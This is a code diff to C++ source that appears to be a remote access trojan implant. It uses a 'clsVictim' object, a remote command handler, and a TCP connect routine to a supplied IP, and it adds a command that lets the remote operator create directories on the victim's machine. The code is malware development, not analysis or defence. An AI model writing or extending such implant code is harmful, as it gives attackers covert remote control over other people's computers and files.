@@ -16,10 +16,11 @@ Author: ISSAC
 
 #include <arpa/inet.h>
 
-///OpenSSL
+//OpenSSL
 #include <openssl/ssl.h>
 #include <openssl/err.h>
 
+//Module
 #include "clsEDP.hpp"
 #include "clsTools.hpp"
 #include "clsVictim.hpp"
@@ -236,6 +237,21 @@ void fnRecvCommand(clsVictim& victim, const std::vector<std::string>& vsMsg)
                 "img",
                 szFilePath,
                 szb64Img,
+            };
+
+            victim.fnSendCommand(ls);
+        }
+        else if (vsMsg[1] == "nd") //New directory
+        {
+            std::string szDirPath = vsMsg[2];
+            auto [nCode, szMsg] = fileMgr.fnMkdir(szDirPath);
+
+            STRLIST ls = {
+                "file",
+                "nd",
+                szDirPath,
+                std::to_string(nCode),
+                szMsg,
             };
 
             victim.fnSendCommand(ls);
@@ -578,7 +594,7 @@ void fnTcpConnect(std::string& szIP, int nPort)
     int sktSrv = socket(AF_INET, SOCK_STREAM, 0);
     sockaddr_in srvAddr {};
     srvAddr.sin_family = AF_INET;
-    srvAddr.sin_port = htons(nPort);
+    srvAddr.sin_port   = htons(nPort);
     inet_pton(AF_INET, szIP.data(), &srvAddr.sin_addr);
 
     if (connect(sktSrv, (struct sockaddr *)&srvAddr, sizeof(srvAddr)) < 0)
